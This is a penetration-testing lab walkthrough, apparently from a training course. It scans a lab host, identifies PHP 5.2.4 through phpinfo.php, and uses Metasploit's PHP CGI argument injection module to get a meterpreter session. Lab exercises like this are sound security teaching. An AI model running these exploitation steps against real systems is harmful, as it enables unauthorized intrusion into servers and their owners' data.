
**Step 1:** Open the lab link to access the Kali machine.

![Content Image](https://assets.ine.com/lab/learningpath/4cb65a44841b2727eaae38088eeba2355988aaac59057307fc22e9a2792595b0.jpg)

**Step 2:** Check if the target machine is reachable:

**Command:**

```
ping -c 4 demo.ine.local
```

![Content Image](https://assets.ine.com/lab/learningpath/3e86a096c128288aa5680d2674bd851a59e7e74c29c63d17ce1e33e3e42ce10c.jpg)

The target is reachable.

**Step 3:** Port scanning with Nmap.

In this lab, we will be targeting port 80 running Apache as it has been configured to use PHP as the server side language. As a result, we can limit our Nmap scan to port 80.

We can identify vulnerabilities or misconfigurations on port 80 by performing an Nmap script scan with the default Nmap script option. This can be done by running the following command:

**Command:**

```
nmap -sV -sC -p 80 demo.ine.local
```

As shown in the following screenshot, the Nmap scan reveals that**Apache 2.2.8**is running on port 80.

![Content Image](https://assets.ine.com/lab/learningpath/c8e963949a81d8981e44b2915ce31d0e4bc04ec18c4647f9b76a25cf6ee8744b.jpg)

**Step 4:** Enumerating PHP information.

We can identify the version of PHP running on the web server by accessing the **phpinfo.php** file in a browser as shown in the following screenshot.

![Content Image](https://assets.ine.com/lab/learningpath/868a1e3755fc9c34ab5673109f617d3eb175f440ec9ce093ec4f4aec5156ebff.jpg)

The **phpinfo.php** file reveals that **PHP 5.2.4** is running on the web server.

**Step 5:** Searching for exploits with Searchsploit.

Now that we have identified the exact version of PHP running on the web server, we can utilize a tool like Searchsploit to find exploits affecting this version of PHP.

This can be done by running the following command:

**Command:**

```
searchsploit php cgi
```

As shown in the following screenshot, the Searchsploit search reveals quite a few exploits, however, one stands out as a potentially useful exploit.

![Content Image](https://assets.ine.com/lab/learningpath/c6e8c2c886cffc8d9a2bec16b4d82a41773bd451a4cc6af89b8cae007cb3e71d.jpg)

This exploit is available as a Metasploit framework exploit module.

We will need to start the Metasploit Framework console (msfconsole) in order to use this exploit, this can be done by running the following command:

**Command:**

```
msfconsole
```

We can now load the module by running the following command:

**Command:**

```
use exploit/multi/http/php_cgi_arg_injection
```

After loading the module, we will need to configure the module options, more specifically, we will need to set the target.

**Command:**

```
set RHOSTS demo.ine.local
```

We can now execute the exploit module by running the following command:

**Command:**

```
run
```

As shown in the following screenshot, the exploit runs successfully and provides us with a meterpreter session on the target system.

![Content Image](https://assets.ine.com/lab/learningpath/e9bd55e7eb8802fbd5ab5646f95727e4ebfb2c5ef90790f7be7c8d285c3b9810.jpg)